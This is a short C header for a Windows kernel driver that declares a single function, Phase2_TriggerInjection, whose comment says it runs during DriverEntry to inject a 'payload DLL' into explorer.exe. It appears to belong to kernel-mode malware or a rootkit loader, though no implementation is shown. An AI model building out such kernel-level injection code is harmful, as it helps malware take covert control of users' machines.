#pragma once
#include <ntddk.h>

#ifdef __cplusplus
extern "C" {
#endif

// Called once during DriverEntry to inject the payload DLL into explorer.exe
NTSTATUS Phase2_TriggerInjection(void);

#ifdef __cplusplus
}
#endif
